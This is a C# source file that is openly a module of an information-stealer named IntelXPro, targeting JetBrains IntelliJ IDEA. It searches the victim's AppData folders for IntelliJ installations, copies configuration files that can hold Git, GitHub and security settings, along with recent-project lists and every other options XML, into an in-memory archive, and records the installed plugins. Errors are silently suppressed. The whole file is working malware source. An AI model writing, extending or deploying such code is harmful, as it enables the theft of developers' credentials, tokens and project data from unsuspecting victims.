using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class IntelliJIDEA : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "JetBrains");
            string localAppDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "JetBrains");

            if (!Directory.Exists(appDataPath) && !Directory.Exists(localAppDataPath))
            {
                return;
            }

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "IntelliJIDEA";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(localAppDataPath))
            {
                foundData |= CollectFromDirectory(localAppDataPath, "LocalAppData", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] ideaDirs = Directory.GetDirectories(basePath, "IntelliJIdea*", SearchOption.TopDirectoryOnly);

                foreach (string ideaDir in ideaDirs)
                {
                    string versionName = Path.GetFileName(ideaDir);
                    
                    string[] configFiles = new string[]
                    {
                        "options\\ide.general.xml",
                        "options\\recentProjects.xml",
                        "options\\other.xml",
                        "options\\git.xml",
                        "options\\github.xml",
                        "options\\vcs.xml",
                        "options\\security.xml"
                    };

                    foreach (string configFile in configFiles)
                    {
                        string fullPath = Path.Combine(ideaDir, configFile);
                        if (File.Exists(fullPath))
                        {
                            string zipPath = $"Applications\\IntelliJIDEA\\{location}\\{versionName}\\{configFile.Replace("\\", "/")}";
                            zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                            counterApplications.Files.Add(fullPath + " => " + zipPath);
                            foundData = true;
                        }
                    }

                    string optionsPath = Path.Combine(ideaDir, "options");
                    if (Directory.Exists(optionsPath))
                    {
                        string[] xmlFiles = Directory.GetFiles(optionsPath, "*.xml", SearchOption.TopDirectoryOnly);
                        
                        foreach (string file in xmlFiles)
                        {
                            string fileName = Path.GetFileName(file);
                            if (!fileName.StartsWith("ide.") && !fileName.StartsWith("recent") && !fileName.StartsWith("other"))
                            {
                                string zipPath = $"Applications\\IntelliJIDEA\\{location}\\{versionName}\\options\\{fileName}";
                                zip.AddFile(zipPath, File.ReadAllBytes(file));
                                counterApplications.Files.Add(file + " => " + zipPath);
                                foundData = true;
                            }
                        }
                    }

                    string pluginsPath = Path.Combine(ideaDir, "plugins");
                    if (Directory.Exists(pluginsPath))
                    {
                        string[] pluginDirs = Directory.GetDirectories(pluginsPath);
                        
                        StringBuilder pluginsList = new StringBuilder();
                        pluginsList.AppendLine("Installed Plugins:");
                        pluginsList.AppendLine();
                        
                        foreach (string pluginDir in pluginDirs)
                        {
                            string pluginName = Path.GetFileName(pluginDir);
                            pluginsList.AppendLine("- " + pluginName);
                        }
                        
                        if (pluginDirs.Length > 0)
                        {
                            string zipPath = $"Applications\\IntelliJIDEA\\{location}\\{versionName}\\plugins_list.txt";
                            zip.AddTextFile(zipPath, pluginsList.ToString());
                            counterApplications.Files.Add(zipPath);
                            foundData = true;
                        }
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
